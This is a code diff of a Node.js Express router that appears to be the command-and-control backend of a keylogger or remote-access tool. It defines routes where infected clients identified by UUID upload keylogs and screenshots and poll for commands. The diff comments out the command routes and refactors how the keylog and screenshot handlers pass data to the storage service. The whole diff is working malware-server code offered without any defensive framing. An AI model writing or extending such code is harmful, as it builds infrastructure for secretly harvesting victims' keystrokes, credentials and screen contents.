@@ -15,7 +15,7 @@ router.put('/:uuid', async (req, res, next) => {
         res.status(isNew ? 201 : 200).json(data)
     } catch (e) { next(e) }
 })
-
+/*
 //At clients polling for retriving the commands list
 router.get('/:uuid/commands', async (req, res, next) => {
     try {
@@ -31,11 +31,14 @@ router.put('/:uuid/commands', async (req, res, next) => {
         res.status(isAdded ? 201 : 204).json(data)
     } catch (e) { next(e) }
 })
-
+*/
 //At clients sending keylogs
 router.post('/:uuid/keylogs', async (req, res, next) => {
     try {
-        const { isAdded } = await clientService.addKeylogs(req.params.uuid, req.body)
+        const { isAdded } = await clientService.addKeylogs({
+            uuid: req.params.uuid,
+            data: req.body
+        })
         res.status(isAdded ? 201 : 304).json()
     } catch (e) { next(e) }
 })
@@ -43,7 +46,10 @@ router.post('/:uuid/keylogs', async (req, res, next) => {
 //At clients sending screenshots
 router.post('/:uuid/screenshot', async (req, res, next) => {
     try {
-        const { isAdded } = await clientService.addScreenshot(req.params.uuid, req.body)
+        const { isAdded } = await clientService.addScreenshot({
+            uuid: req.params.uuid,
+            data: req.body
+        })
         res.status(isAdded ? 201 : 304).json()
     } catch (e) { next(e) }
 })
